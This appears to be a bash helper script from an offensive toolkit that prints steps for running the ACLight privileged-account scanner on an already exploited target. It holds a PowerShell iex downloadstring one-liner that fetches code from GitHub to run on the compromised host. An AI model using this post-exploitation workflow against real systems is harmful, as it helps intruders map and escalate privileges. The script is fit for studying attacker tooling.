#!/bin/bash
LPATH='/opt/sifter/'
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'
instructions(){
    echo -e "${RED}"
    figlet ACLight2
    echo -e "${ORNG}"
    echo -e "${W}Once you have a shell session open on an exploited target"
    echo -e "run ${YLW}pwsh ${W}to open a powershell session"
    echo -e "Once you have powershell open in target session, please hit enter"
    read RANDOM
    echo -e "${W}Now run the following commands in order to get the required files on target system${NC}"
    echo ""
    echo -e "${YLW}iex(new-object net.webclient).downloadstring('https://github.com/cyberark/ACLight/archive/master.zip')"
    echo -e "unzip master.zip"
    echo -e "cd ACLight-master"
    echo ""
    echo -e "${W}Then finally run \n${LBBLUE}cmd start Execute-ACLight.bat${NC} \n${W}to execute${NC}"
}

xterm -e instructions

##########################______________ VGhlIERlYWQgQnVubnkgQ2x1Yg== ______________##########################